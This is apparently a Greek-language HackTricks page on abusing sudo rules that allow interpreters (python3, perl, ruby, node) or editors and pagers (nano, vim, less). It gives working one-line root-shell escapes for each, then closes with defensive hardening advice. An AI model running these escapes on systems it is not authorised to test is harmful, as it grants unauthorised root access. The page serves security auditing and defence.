# Κατάχρηση εντολών Sudo

{{#include ../../banners/hacktricks-training.md}}

## Διερμηνευτές που επιτρέπονται από το Sudo

Αν το `sudo -l` επιτρέπει σε έναν χρήστη να εκτελέσει έναν διερμηνευτή ως root, αντιμετωπίστε το ως άμεση εκτέλεση κώδικα. Οι διερμηνευτές έχουν σχεδιαστεί για να εκτελούν αυθαίρετο κώδικα, επομένως ένας κανόνας που επιτρέπει τα binaries `python3`, `perl`, `ruby`, `lua`, `node` ή παρόμοια ισοδυναμεί συνήθως με εκτέλεση εντολών ως root, εκτός αν τα ορίσματα είναι αυστηρά περιορισμένα και επικυρωμένα.

Συνήθης ροή ελέγχου:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Άλλα παραδείγματα interpreters:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Η ακριβής διαδρομή έχει σημασία. Αν ο κανόνας sudo επιτρέπει το `/usr/bin/python3`, χρησιμοποιήστε αυτήν την ακριβή διαδρομή κατά την επικύρωση:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editors που επιτρέπονται μέσω sudo

Αν το `sudo -l` επιτρέπει σε έναν χρήστη να εκτελεί έναν interactive editor ως root, αντιμετωπίστε το ως επιφάνεια εκτέλεσης εντολών και όχι ως ακίνδυνη άδεια επεξεργασίας αρχείων. Οι editors συχνά μπορούν να εκτελούν shell commands, να διαβάζουν αυθαίρετα αρχεία, να γράφουν αυθαίρετα αρχεία ή να καλούν external helpers μέσα από τον editor.

Συνήθης ροή ελέγχου:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Εκτέλεση εντολών μέσω Nano

Όταν το `nano` επιτρέπεται μέσω sudo, η εκτέλεση εντολών μπορεί να είναι προσβάσιμη από τη διεπαφή του editor:
```text
Ctrl+R
Ctrl+X
```
Στη συνέχεια, παρέχετε μια εντολή όπως:
```bash
id
/bin/sh
```
Σε ορισμένα terminals, ένα interactive shell μπορεί να χρειάζεται ανακατεύθυνση των standard streams:
```bash
reset; /bin/sh 1>&0 2>&0
```
Η ακριβής ακολουθία πλήκτρων μπορεί να διαφέρει ανάλογα με την έκδοση και τις επιλογές build του nano, αλλά το security issue είναι το ίδιο: ο editor εκτελείται ως root και μπορεί να εκτελεί external commands.

### Άλλες συνηθισμένες διαφυγές από editors

Οι editors τύπου Vim συνήθως παρέχουν εκτέλεση εντολών μέσω του `:!`:
```text
:!/bin/sh
```
Οι pagers όπως το `less` μπορούν επίσης να επιτρέψουν την εκτέλεση shell:
```text
!/bin/sh
```
## Αμυντικές σημειώσεις

- Αποφύγετε την παροχή interpreters ή interactive editors μέσω sudo.
- Προτιμήστε σταθερά wrappers, ιδιοκτησίας του root, που εκτελούν μία συγκεκριμένη διαχειριστική ενέργεια.
- Αν ένας interpreter είναι αναπόφευκτος, περιορίστε το ακριβές path του script και αποτρέψτε arguments που ελέγχονται από τον χρήστη, writable imports, `PYTHONPATH` και μη ασφαλή διατήρηση του environment.
- Αν απαιτείται επεξεργασία αρχείων, περιορίστε το ακριβές path του αρχείου και εξετάστε τη χρήση του `sudoedit` με patched εκδόσεις του sudo και αυστηρό χειρισμό του environment.
- Ελέγξτε τα `SETENV`, `env_keep`, τα writable working directories, τα writable module/import paths, τα `NOEXEC`, `use_pty` και το logging, αλλά μην τα θεωρείτε πλήρες sandbox.
